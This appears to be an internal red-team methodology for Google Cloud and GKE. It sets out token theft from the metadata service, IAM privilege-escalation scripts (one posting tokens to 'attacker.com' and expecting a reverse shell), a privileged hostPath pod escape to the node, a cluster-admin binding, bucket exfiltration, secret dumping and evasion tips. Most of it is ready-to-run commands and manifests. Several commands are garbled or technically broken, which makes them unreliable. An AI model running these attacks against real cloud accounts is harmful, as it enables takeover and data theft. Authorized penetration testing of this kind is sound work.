# GCP Cloud Security Testing Methodology
**Hybrid Multi-Cloud Black-Box Security Assessment**  
**Version:** 4.0 (Expanded with Advanced IAM + Full Kubernetes Privilege Escalation & Exploit Scripts)  
**Date:** March 24, 2026  
**Author:** Senior Hybrid Multi-Cloud Security Architect & Red Team Engineer  
**Classification:** Internal – Authorized Testing Only  

---

## 1. Disclaimer and Authorized Use
This methodology is **strictly for authorized penetration testing and red-team exercises** in environments where the organization has provided **explicit written permission**. All activities must comply with the client’s Rules of Engagement (RoE), applicable regulations (e.g., SOC 2, ISO 27001, HIPAA, PCI-DSS, FedRAMP), and local laws.  

**Non-compliance will result in immediate termination of testing and potential legal action.**  
Testing must be non-destructive unless explicit destructive testing is approved in writing.

---

## 2. Introduction
This document provides a **production-ready, repeatable black-box security testing methodology** for GCP environments. Testing is performed **from within the GCP environment** using two dedicated attacker VMs:
- Windows Box in GCP
- Linux Box in GCP  

The goal is to simulate a compromised workload (e.g., Compute Engine VM) and assess the blast radius of the attached service account, escalate privileges, enumerate resources, identify misconfigurations, and demonstrate impact.

---

## 3. Objectives
- Enumerate current identity and effective permissions (black-box starting point)
- Identify privilege-escalation paths, including advanced IAM and Kubernetes techniques
- Discover and assess compute, storage, networking, databases, IAM, logging, and other services
- Validate security controls and detection capabilities
- Produce actionable findings with remediation guidance

---

## 4. Prerequisites
- Explicit RoE and Get-Out-of-Jail-Free letter
- Dedicated test project(s) or scoped production resources
- Network reachability to GCP metadata service (169.254.169.254)
- Internet access from test VMs (for tool downloads)
- Approved IP ranges for any external callbacks

---

## 5. Testing Platforms

### 5.1 Windows Box in GCP (Recommended: Windows Server 2022/2025)
- Install **Google Cloud CLI** (gcloud) via official MSI: https://cloud.google.com/sdk/docs/install#windows
- Install PowerShell 7+ and `jq` (via Chocolatey or manual)
- Install Python 3.11+ and required packages (`pip install google-auth requests`)

### 5.2 Linux Box in GCP (Recommended: Ubuntu 22.04/24.04 LTS or Debian 12)
- Use official GCP Debian/Ubuntu images (gcloud is often pre-installed)
- Install/update tools:
  ```bash
  sudo apt update && sudo apt install -y google-cloud-cli curl jq python3-pip git
  pip3 install google-auth requests


  6. Phase 1: Initial Foothold & Identity Enumeration
6.1 Query Instance Metadata Service (both platforms)
Linux:
Bash# Get service account email
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Get access token
TOKEN=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r .access_token)
echo $TOKEN
Expected Output:
texttest-sa@my-project.iam.gserviceaccount.com
ya29.c.b0AX...
Windows (PowerShell):
PowerShell$Metadata = Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true" -Headers @{"Metadata-Flavor"="Google"}
$Metadata | ConvertTo-Json
Expected Output:
JSON{
  "email": "test-sa@my-project.iam.gserviceaccount.com",
  "scopes": ["https://www.googleapis.com/auth/cloud-platform"]
}
6.2 Authenticate CLI
Linux:
Bashgcloud auth activate-service-account --key-file=/dev/null --token=$TOKEN
gcloud config set project $(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id)
Windows:
PowerShellgcloud auth activate-service-account --token=$TOKEN
6.3 Enumerate Current Permissions
Linux & Windows (same command):
Bashgcloud iam service-accounts get-iam-policy $(gcloud iam service-accounts list --format="value(email)" | head -1)
Expected Output:
JSON{
  "etag": "BwABCDEF...",
  "bindings": [
    {
      "role": "roles/owner",
      "members": ["serviceAccount:test-sa@my-project.iam.gserviceaccount.com"]
    }
  ]
}
Test effective permissions:
Bashg
cloud projects get-iam-policy $$   (gcloud config get-value project) --flatten="bindings[].members" --format="table(bindings.members, bindings.role)" | grep -E "   $$(gcloud iam service-accounts list --format='value(email)')"

7. Phase 2: Privilege Escalation
Reference: Rhino Security Labs GCP IAM Privilege Escalation Matrix (advanced techniques expanded below).

Core techniques (prioritized):
iam.serviceAccounts.create + iam.serviceAccountKeys.create → new SA with owner role
iam.serviceAccounts.setIamPolicy on existing high-priv SA
cloudbuild.builds.create → execute arbitrary code as project editor
iam.serviceAccounts.actAs on Compute Instance or Cloud Function
iam.roles.update / iam.roles.create
storage.buckets.setIamPolicy on sensitive buckets
compute.instances.setServiceAccount on existing VMs

Advanced IAM techniques (Rhino Security Labs):

deploymentmanager.deployments.createRequired:deploymentmanager.deployments.create
Description: Create deployments using the default Cloud Services SA (Editor role) to create resources with elevated perms.

Command (Linux):Bash
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
python3 GCP-IAM-Privilege-Escalation/ExploitScripts/deploymentmanager.deployments.create.py
Expected Output: Deployment created with Editor perms; new resources owned by high-priv SA.

iam.roles.update
Required:iam.roles.update on custom role
Description: Update includedPermissions of custom role assigned to current identity to add high-priv perms.

Command:Bash
python3 iam.roles.update.py --role custom-role-name
Expected Output: Role updated with new perms like iam.serviceAccountKeys.create.

iam.serviceAccounts.getAccessToken
Required:iam.serviceAccounts.getAccessToken
Description: Get short-lived token for target SA via IAM Credentials API.

Command:Bash
python3 iam.serviceAccounts.getAccessToken.py --target-sa target@project.iam.gserviceaccount.com
Expected Output: Access token retrieved for target SA.

iam.serviceAccounts.signBlob/signJwt
Required:iam.serviceAccounts.signBlob or signJwt
Description: Sign payloads to impersonate SA and get token or signed GCS URLs.
Command (signBlob example):Bash
python3 signBlob-accessToken.py --target-sa target@project.iam.gserviceaccount.com
Expected Output: Token signed and retrieved for target SA.

cloudfunctions.functions.create/update
Required:cloudfunctions.functions.create, sourceCodeSet, actAsDescription: Create/update Cloud Function running as target SA to exfil token on invoke.
Command:Bash
python3 cloudfunctions.functions.create-call.py --target-sa target@project.iam.gserviceaccount.com
Expected Output: Function created; invoke to get SA token.

cloudbuild.builds.create (RCE to SA token)
Required:cloudbuild.builds.create
Description: Submit build with malicious code to RCE on Cloud Build worker and exfil SA token.
Command:Bash
python3 cloudbuild.builds.create.py --exfil-url http://attacker.com
Expected Output: Reverse shell; token exfiltrated from /root/tokencache/gsutil_token_cache.

run.services.createRequired:run.services.create, actAs
Description: Create Cloud Run service as target SA to get token on invoke.
Command:Bash
python3 run.services.create.py --target-sa target@project.iam.gserviceaccount.com
Expected Output: Service created; invoke for token.

Automated tooling:
Bashgit clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
python3 check_for_privesc.py
Expected Tool Output:
text[+] Found 7 privesc paths including advanced: cloudbuild.builds.create, deploymentmanager.deployments.create

8. Phase 3: Comprehensive Resource Enumeration
8.1 Core GCP Services (gcloud commands)
Bash
# Projects & IAM
gcloud projects list
gcloud organizations list
gcloud iam service-accounts list --format="table(email,displayName)"

# Compute
gcloud compute instances list
gcloud compute networks list
gcloud compute firewalls list

# Storage
gsutil ls -r
gsutil iam get gs://BUCKET_NAME

# Databases & Secrets
gcloud sql instances list
gcloud spanner instances list
gcloud secrets list

# Logging & Monitoring
gcloud logging logs list
gcloud monitoring dashboards list

# Kubernetes / GKE
gcloud container clusters list
kubectl get nodes --all-namespaces 2>/dev/null || echo "No kubectl context"

Automated scanning tools (Linux preferred):
Bash
# Prowler for GCP
pip3 install prowler
prowler gcp --region us-central1

Expected Prowler Output (snippet):
text[INFO] Profile: default
[CHECK_ID] 3.1 Ensure that Cloud Audit Logging is enabled... PASS
[CHECK_ID] 3.2 Ensure that BigQuery datasets are encrypted... FAIL (High)
Total: 245 checks, 12 FAIL, 8 WARN

Bash
# Scout Suite (multi-cloud)
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite && python3 Scout.py gcp

Expected Scout Suite Output:
text[+] GCP assessment completed
[+] 45 findings (12 critical, 18 high)
Report generated: report.html

9. Phase 4: Container Security Testing (GKE)
Prerequisites: Successful enumeration of GKE clusters via gcloud container clusters list. Obtain kubeconfig:
Bash
gcloud container clusters get-credentials CLUSTER_NAME --zone ZONE

9.1 K8s Enumeration
Bash
kubectl get nodes -o wide
kubectl get pods --all-namespaces
kubectl get clusterrolebindings
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i '*' '*' --all-namespaces

9.2 Advanced Kubernetes Privilege Escalation Techniques

Privileged Pod Breakout – Deploy privileged container to escape to node.
HostPath Volume Mount – Mount host filesystem for root access.
Kubelet API Abuse – If anonymous access or weak auth on kubelet.
RBAC Abuse – Create ClusterRoleBinding for cluster-admin.
ServiceAccount Token Theft – Extract node SA token → cloud IAM abuse (GKE node SA often has high perms).
DaemonSet Deployment – Run pod on every node for full cluster compromise.

9.3 Full Exploit Scripts
Full RBAC Enumeration Script (enumerate-k8s-privesc.sh):
Bash
#!/bin/bash
echo "[+] Starting K8s Privilege Escalation Enumeration"
kubectl get clusterroles,clusterrolebindings,roles,rolebindings --all-namespaces
kubectl auth can-i --list --all-namespaces
echo "[+] Checking for privileged pods:"
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}'
echo "[+] Checking for hostPath volumes:"
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[]?.hostPath != null) | .metadata.name'
echo "[+] Done. Look for 'yes' or hostPath pods."

Full Privileged Pod Breakout Exploit (privileged-pod.yaml):
YAML
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: default
spec:
  containers:
  - name: privesc
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - mountPath: /host
      name: host-fs
  volumes:
  - name: host-fs
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
  hostIPC: true

Usage:
Bash
kubectl apply -f privileged-pod.yaml
kubectl exec -it privesc-pod -- chroot /host /bin/sh

Expected Output: Root shell on the GKE node (access to /host/etc/kubernetes and node IAM token at /var/lib/kubelet/pods/.../token).

Full HostPath + Chroot Script (after pod exec):
Bash
chroot /host /bin/sh -c 'cat /var/lib/kubelet/pods/*/token | base64 -d > /tmp/node-token.txt'
curl -H "Authorization: Bearer $(cat /tmp/node-token.txt)" -k https://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token


Full RBAC ClusterRoleBinding Abuse (cluster-admin-binding.yaml):
YAML
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: privesc-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io

Usage: kubectl apply -f cluster-admin-binding.yaml

Expected Output: Attacker now has cluster-admin rights.
Cloud-Specific (GKE): Node service accounts often have roles/container.developer or higher – exfil token from node and impersonate via gcloud auth activate-service-account.

10. Phase 5: Targeted Attack Scenarios & Best Practices

Storage exfiltration – gsutil cp -r gs://sensitive-bucket .
Secret dumping – gcloud secrets versions access latest --secret=SECRET_NAME
Lateral movement – Impersonate other service accounts via gcloud auth activate-service-account
Data-plane attacks – Test GKE pod escape, Cloud Function RCE, etc.
Evasion – Use --impersonate-service-account, rotate tokens, avoid noisy APIs

Windows-specific tooling:

Use Invoke-GCPEnum.ps1 (community) or custom PowerShell wrappers around gcloud.


11. Logging, Monitoring & Detection Evasion

All gcloud calls generate Audit Logs in Cloud Logging
Enable VPC Flow Logs, Cloud Asset Inventory, and Forseti/Policy Analyzer for detection
Document every command executed for the final report


12. Reporting & Deliverables

Executive summary
Technical findings with screenshots, commands, and impact
Privilege-escalation proof-of-concept videos (if approved)
Risk-rated recommendations with remediation steps
Lessons learned for hybrid multi-cloud environment


13. Cleanup
Bashgcloud auth revoke
rm -rf ~/.config/gcloud
# Delete any test resources created during testing